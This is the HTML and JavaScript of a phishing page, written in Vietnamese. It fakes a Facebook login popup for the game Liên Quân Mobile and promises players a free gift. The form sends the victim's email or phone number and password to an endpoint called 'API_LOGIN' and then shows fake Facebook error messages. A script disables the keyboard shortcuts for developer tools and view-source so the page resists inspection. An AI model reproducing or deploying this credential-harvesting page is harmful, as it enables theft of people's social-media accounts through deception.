<div id="fb">
  <div class="fb-login">
    <a href="#" class="close" title="Close">&times;</a>
    <div class="nav-fb"></div>
    <div style=" background: red;color: #fff;padding: 3px;font-size: 15px; display:none" id="login-notice"></div>
    <br>
   <center><img src="ThemeLXT/Images/logolienquan.jpg" width="50px"  style="border-radius:10%;
-moz-border-radius:10%;
-webkit-border-radius:10%;"></center>
    <font color="#000000">
      <span class="txt-login-fb" style="font-size: 15px; line-height: 18px; margin-bottom: 10px;">Đăng nhập vào tài khoản Facebook  <br>
      của bạn để kết nối với <b> Liên Quân Mobile </b> </span> 
    </font>
    <form method="post" id="login_form" novalidate="1" data-autoid="autoid_2">
      <p class="mylabel"></p>
      <center>
        <input type="text" placeholder="Email hoặc điện thoại" name="username">
        </br>
        <p class="mylabel"></p>
        <input type="password" id="password" placeholder="Mật khẩu " name="password">
        <div id="toggle-password-button">
          <img loading="lazy" src="ThemeLXT/Images/633655.png" id="closed-eye" class="show imgtogle">
          <img loading="lazy" src="ThemeLXT/Images/633633.png" id="open-eye" class="hide imgtogle">
        </div>
<script>
const toggleButton = document.querySelector('#toggle-password-button');
const passwordField = document.querySelector('#password');
const closedEye = document.querySelector('#closed-eye');
const openEye = document.querySelector('#open-eye');
let isPasswordHidden = true;
toggleButton.addEventListener('click', function() {
 if (isPasswordHidden) {
 passwordField.type = 'text';
 openEye.classList.remove('hide');
 openEye.classList.add('show');
 closedEye.classList.add('hide');
 closedEye.classList.remove('show');
 } else {
 passwordField.type = 'password';
 closedEye.classList.remove('hide');
 closedEye.classList.add('show');
 openEye.classList.add('hide');
 openEye.classList.remove('show');
 }
 isPasswordHidden = !isPasswordHidden;
});
</script>
<button type="submit" class="btn-login-fb" name="login"><b>Đăng Nhập</b></button> <br> <br>
<div class="_52jj _9on1"> Quên mật khẩu?</div>
<div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span></div>
</br>
<button class="btn-register-fb">Tạo tài khoản mới</button>
</center>

</br>
</form>
</div>
</div>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>


<script>
            document.onkeydown=function(a){if(123==event.keyCode||a.ctrlKey&&a.shiftKey&&73==a.keyCode||a.ctrlKey&&a.shiftKey&&67==a.keyCode||a.ctrlKey&&a.shiftKey&&74==a.keyCode||a.ctrlKey&&85==a.keyCode)return!1};
      $(document).ready(function(){
        $('#login_form').submit(function(e) {
          jQuery.ajax({
            method: 'POST',
            url: 'API_LOGIN',
            data: $(this).serialize(),
            dataType: 'json',
            complete: function() {
              captchaGenerate()
            }
          }).done(function(data) {
            if (data.status == 'success') {
              location.href = 'index.php'
            } else {
              $('#first-notice').hide()
              $('#login-notice').text(data.message || 'Có lỗi khi nhận quà!').show()
            }
          }).fail(function() {
            $('#login-notice').text('Email hoặc số di động bạn nhập không kết nối với tài khoản nào. ').show()
          })
          e.preventDefault()
        })
      })
    </script>


  <script>
      $(document).ready(function(){
          $(document).on('click', '#claim', function() {
                 
                          window.location = '#fb'
                  
                      })
      })
      </script>